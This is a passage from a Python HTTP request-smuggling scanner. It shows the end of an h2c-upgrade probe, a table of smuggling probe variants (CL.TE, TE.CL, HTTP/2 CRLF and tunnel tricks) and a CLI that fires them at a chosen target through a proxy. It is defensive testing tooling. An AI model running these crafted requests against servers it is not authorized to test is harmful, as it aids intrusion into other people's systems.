        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n"
    ).encode()
    resp, ms = _send_h1(sock, req, idle_window=1.5, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    if status == 101 or b"PRI * HTTP/2.0" in resp[:128] or resp[:6] == b"\x00\x00\x12\x04":
        verdict = "vuln"
        detail = "backend accepted h2c upgrade — h2c smuggling primitive"
    elif status and 400 <= status < 500:
        verdict = "safe"
        detail = f"server rejected h2c upgrade ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, status_probe=status, detail=detail)


PROBE_FUNCS = {
    "cl.te": probe_cl_te,
    "te.cl": probe_te_cl,
    "te.te": probe_te_te,
    "cl.0": probe_cl_0,
    "0.cl": probe_0_cl,
    "h2.cl": probe_h2_cl,
    "h2.te": probe_h2_te,
    "h2.crlf": probe_h2_crlf,
    "h2.tunnel": probe_h2_tunnel,
    "conn.state": probe_conn_state,
    "hop.smuggle": probe_hop_smuggle,
    "expect.100": probe_expect_100,
    "h2c.upgrade": probe_h2c_upgrade,
}


# ---------- CLI ----------
def main(argv: list[str]) -> int:
    p = argparse.ArgumentParser(description="HTTP request-smuggling probe via Caido")
    p.add_argument("--target", help="https://host[:port]/path (required unless --list)")
    p.add_argument("--proxy", default=DEFAULT_PROXY, help=f"upstream proxy (default {DEFAULT_PROXY})")
    p.add_argument("--probes", default="all", help="comma-separated probe names or 'all'")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    p.add_argument("--json", dest="json_out", help="write results to JSON file")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--list", action="store_true", help="list available probes and exit")
    args = p.parse_args(argv)

    if args.list:
        for n in ALL_PROBES:
            print(n)
        return 0
    if not args.target:
        p.error("--target required")

    probes = ALL_PROBES if args.probes == "all" else [x.strip() for x in args.probes.split(",") if x.strip()]
    bad = [x for x in probes if x not in PROBE_FUNCS]
    if bad:
        print(f"unknown probes: {bad}", file=sys.stderr)
        return 2

    if not args.quiet:
        print(f"[+] target  : {args.target}")
        print(f"[+] proxy   : {args.proxy} (Caido)")
        print(f"[+] probes  : {','.join(probes)}")
        print(f"[+] timeout : {args.timeout}s")
        print("[+] measuring baseline...")

    baseline_ms, baseline_status = _baseline_timing(args.target, args.proxy, args.timeout)
    if not args.quiet:
        print(f"[+] baseline: {baseline_ms:.0f}ms status={baseline_status}")
        print()

    results: list[ProbeResult] = []
    for name in probes:
        if not args.quiet:
            print(f"[*] {name} ...", end=" ", flush=True)
        try:
            res = PROBE_FUNCS[name](args.target, args.proxy, args.timeout, baseline_ms)
        except Exception as e:  # noqa: BLE001
            res = ProbeResult(name=name, verdict="error", detail=f"unhandled: {type(e).__name__}: {e}")
        results.append(res)
        if not args.quiet:
            tag = {"vuln": "VULN", "safe": "safe", "inconclusive": "????", "error": "ERR "}.get(res.verdict, "????")
            print(f"{tag}  {res.detail}")

    out = {
        "target": args.target,
        "proxy": args.proxy,
        "baseline_ms": baseline_ms,
        "baseline_status": baseline_status,
        "results": [asdict(r) for r in results],
    }
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            json.dump(out, fh, indent=2)
        if not args.quiet:
            print(f"\n[+] wrote {args.json_out}")

    vuln = [r for r in results if r.verdict == "vuln"]
    if not args.quiet:
        print()
        print(f"[+] summary: {len(vuln)} vuln / {len(results)} total")
        for r in vuln:
            print(f"    - {r.name}: {r.detail}")
    return 0 if not vuln else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
